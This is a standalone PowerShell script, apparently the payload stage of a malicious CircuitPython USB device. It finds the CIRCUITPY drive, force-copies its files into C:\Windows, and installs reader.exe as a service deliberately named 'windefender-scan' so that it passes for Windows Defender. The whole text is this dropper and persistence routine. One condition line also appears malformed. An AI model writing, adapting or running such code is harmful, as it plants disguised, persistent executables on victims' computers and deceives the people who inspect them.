$drive = Get-PSDrive | Where-Object { $_.Name -eq 'CIRCUITPY' }

if ($drive) {
    $sourcePath = Join-Path $drive.Root "data"
    $destinationPath = "C:\Windows"

    if (Test-Path $sourcePath) {
        Copy-Item -Path "$sourcePath\*" -Destination $destinationPath -Recurse -Force
        Set-Location -Path $destinationPath

        $nssmPath = "nssm.exe"
        $serviceName = "windefender-scan"
        $exePath = Join-Path $destinationPath "reader.exe"

        if (Test-Path $nssmPath -and Test-Path $exePath) {
            & $nssmPath install $serviceName $exePath
            & $nssmPath start $serviceName
        } else {
            Write-Host "nssm.exe or reader.exe not found."
        }
    } else {
        Write-Host "Source folder 'data' not found."
    }
} else {
    Write-Host "CIRCUITPY drive not found."
}
